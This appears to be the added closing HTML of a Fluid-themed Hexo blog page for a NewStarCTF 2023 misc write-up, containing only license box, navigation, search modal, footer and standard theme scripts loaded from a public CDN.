+        
+  <a href="/categories/CTF-WP/" class="category-chain-item">CTF_WP</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/misc/">#misc</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>newstarctf2023_misc</div>
+      <div>http://ikun604.github.io/2023/11/19/newstar2023-misc/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>yfz-ikun604</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/06/geekchallenge2023wp/" title="geekchallenge">
+                        <span class="hidden-mobile">geekchallenge</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div>ikun604的博客|记录成长的过程</div>  
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
